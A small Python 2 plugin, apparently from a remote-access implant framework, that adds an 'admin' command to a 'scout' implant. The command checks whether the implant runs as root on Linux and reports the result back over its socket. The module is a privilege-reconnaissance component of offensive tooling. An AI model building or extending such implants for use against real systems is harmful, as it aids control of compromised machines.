# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from os import getuid')
        config.functions.append('''
def admin():
    s.sendall('[*]Scout is running as root process : ' + str(getuid() == 0))''')
        config.logics.append('''
            elif command == "admin":
                admin()''')
        config.help_menu['admin'] = 'Checks to see if the scout is running as a process with admin privileges'
    elif option == 'info':
        print '\nName             : Check Admin component' \
              '\nOS               : Linux' \
              '\nRequired Modules : os' \
              '\nCommands         : admin' \
              '\nDescription      : Checks to see if the scout is running as a process with admin privileges\n'
